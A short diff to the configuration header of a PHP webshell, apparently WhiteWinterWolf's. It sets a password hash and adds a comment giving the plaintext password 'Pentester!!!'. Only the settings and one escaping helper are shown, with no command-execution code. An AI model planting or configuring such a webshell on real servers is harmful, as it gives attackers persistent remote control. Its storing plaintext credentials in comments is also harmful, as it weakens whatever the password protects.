@@ -24,9 +24,10 @@
  * Optional password settings.
  * Use the 'passhash.sh' script to generate the hash.
  * NOTE: the prompt value is tied to the hash!
+ * Note: The hash below is for the password: Pentester!!!
  */
 $passprompt = "WhiteWinterWolf's PHP webshell: ";
-$passhash = "";
+$passhash = "41b05b4d1c88f009c11214437f61b90ee130b9f8e80f3a1e4b650e6c2355018e";
 
 function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
 
